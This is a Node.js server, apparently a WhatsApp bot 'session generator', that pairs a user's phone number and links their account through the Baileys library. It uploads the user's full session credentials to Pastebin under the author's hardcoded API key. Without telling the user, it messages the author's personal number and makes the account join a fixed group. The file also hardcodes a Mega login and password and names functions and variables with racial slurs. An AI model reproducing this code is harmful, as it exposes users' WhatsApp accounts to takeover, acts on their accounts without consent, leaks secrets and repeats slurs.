import { Boom } from '@hapi/boom';
import Baileys, {
  DisconnectReason,
  delay,
  Browsers,
  useMultiFileAuthState,
} from '@whiskeysockets/baileys';
import cors from 'cors';
import express from 'express';
import fs from 'fs';
import PastebinAPI from 'pastebin-js';
import path, { dirname } from 'path';
import pino from 'pino';
import { fileURLToPath } from 'url';
import { Mega } from 'megajs'; // Updated import

let pastebin = new PastebinAPI('u9SylH2Qa3eW_UQHq1kivWwKUMcajqLk');

const app = express();

app.use((req, res, next) => {
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  next();
});

app.use(cors());
let PORT = process.env.PORT || 8000;
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

function createRandomId() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let id = '';
  for (let i = 0; i < 10; i++) {
    id += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return id;
}

let sessionFolder = `./auth/${createRandomId()}`;
if (fs.existsSync(sessionFolder)) {
  try {
    fs.rmdirSync(sessionFolder, { recursive: true });
    console.log('Deleted the "SESSION" folder.');
  } catch (err) {
    console.error('Error deleting the "SESSION" folder:', err);
  }
}

let clearState = () => {
  fs.rmdirSync(sessionFolder, { recursive: true });
};

function deleteSessionFolder() {
  if (!fs.existsSync(sessionFolder)) {
    console.log('The "SESSION" folder does not exist.');
    return;
  }

  try {
    fs.rmdirSync(sessionFolder, { recursive: true });
    console.log('Deleted the "SESSION" folder.');
  } catch (err) {
    console.error('Error deleting the "SESSION" folder:', err);
  }
}

app.get('/', async (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/qr', async (req, res) => {
  res.sendFile(path.join(__dirname, 'qr.html'));
});

app.get('/code', async (req, res) => {
  res.sendFile(path.join(__dirname, 'pair.html'));
});

app.get('/pair', async (req, res) => {
  let phone = req.query.phone;

  if (!phone) return res.json({ error: 'Please Provide Phone Number' });

  try {
    const code = await startnigg(phone);
    res.json({ code: code });
  } catch (error) {
    console.error('Error in WhatsApp authentication:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});

async function startnigg(phone) {
  return new Promise(async (resolve, reject) => {
    try {
      if (!fs.existsSync(sessionFolder)) {
        await fs.mkdirSync(sessionFolder);
      }

      const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);

      const negga = Baileys.makeWASocket({
        version: [2, 3000, 1015901307],
        printQRInTerminal: false,
        logger: pino({
          level: 'silent',
        }),
        browser: Browsers.ubuntu('Chrome'),
        auth: state,
      });

      if (!negga.authState.creds.registered) {
        let phoneNumber = phone ? phone.replace(/[^0-9]/g, '') : '';
        if (phoneNumber.length < 11) {
          return reject(new Error('Please Enter Your Number With Country Code !!'));
        }
        setTimeout(async () => {
          try {
            let code = await negga.requestPairingCode(phoneNumber);
            console.log(`Your Pairing Code : ${code}`);
            resolve(code);
          } catch (requestPairingCodeError) {
            const errorMessage = 'Error requesting pairing code from WhatsApp';
            console.error(errorMessage, requestPairingCodeError);
            return reject(new Error(errorMessage));
          }
        }, 10000);
      }

      negga.ev.on('creds.update', saveCreds);

      negga.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
          await delay(10000);

          const output = await pastebin.createPasteFromFile(
            `${sessionFolder}/creds.json`,
            'AmeenInt',
            null,
            1,
            'N'
          );
          const sessi = 'KeikoV5~' + output.split('https://pastebin.com/')[1];
          console.log(sessi);
          await delay(2000);
          let guru = await negga.sendMessage(negga.user.id, { text: sessi });
          await delay(2000);
          await negga.sendMessage(
            negga.user.id,
            {
              text: '*🪀Session Created*\n\n Now U Can Deploy The Bot Anywhere\n\n> Thanks For Using Keiko Bot🌸',
            },
            { quoted: guru }
          );

          await negga.sendMessage('916238768108@s.whatsapp.net', {
            text: `_👀Hᴇʏ Aᴍᴇᴇɴ Sᴇʀ🪄_\n_Keiko-V6 has successfully connected to the server_`,
          });
          
          let groupLink = 'https://chat.whatsapp.com/GVxT4w51GIU3sndNPZGTnw'; // Replace with your actual fixed group link
          await negga.groupAcceptInvite(groupLink.split('/').pop());
          console.log('Connected to WhatsApp Servers');

          try {
            deleteSessionFolder();
          } catch (error) {
            console.error('Error deleting session folder:', error);
          }

          process.send('reset');
        }

        if (connection === 'close') {
          let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
          console.log('Connection Closed:', reason);
          if (reason === DisconnectReason.connectionClosed) {
            console.log('[Connection closed, reconnecting....!]');
            process.send('reset');
          } else if (reason === DisconnectReason.connectionLost) {
            console.log('[Connection Lost from Server, reconnecting....!]');
            process.send('reset');
          } else if (reason === DisconnectReason.loggedOut) {
            clearState();
            console.log('[Device Logged Out, Please Try to Login Again....!]');
            clearState();
            process.send('reset');
          } else if (reason === DisconnectReason.restartRequired) {
            console.log('[Server Restarting....!]');
            startnigg();
          } else if (reason === DisconnectReason.timedOut) {
            console.log('[Connection Timed Out, Trying to Reconnect....!]');
            process.send('reset');
          } else if (reason === DisconnectReason.badSession) {
            console.log('[BadSession exists, Trying to Reconnect....!]');
            clearState();
            process.send('reset');
          } else if (reason === DisconnectReason.connectionReplaced) {
            console.log(`[Connection Replaced, Trying to Reconnect....!]`);
            process.send('reset');
          } else {
            console.log('[Server Disconnected: Maybe Your WhatsApp Account got Fucked....!]');
            process.send('reset');
          }
        }
      });

      negga.ev.on('messages.upsert', () => {});
    } catch (error) {
      console.error('An Error Occurred:', error);
      throw new Error('An Error Occurred');
    }
  });
}

async function uploadToMega(filePath) {
  const mega = new Mega();

  try {
    const client = await mega.login('ameenxnt@gmail.com', 'meeramimmi'); // Your Mega account credentials
    const upload = client.upload(filePath);

    upload.on('progress', (progress) => {
      console.log('Upload progress:', progress);
    });

    upload.on('complete', (file) => {
      console.log('File uploaded to Mega:', file);
    });
  } catch (error) {
    console.error('Error uploading to Mega:', error);
  }
}

// Call uploadToMega(filePath) where you need to upload a file
// Example: uploadToMega('path/to/your/file.txt');

app.listen(PORT, () => {
  console.log(`API Running on PORT:${PORT}`);
});
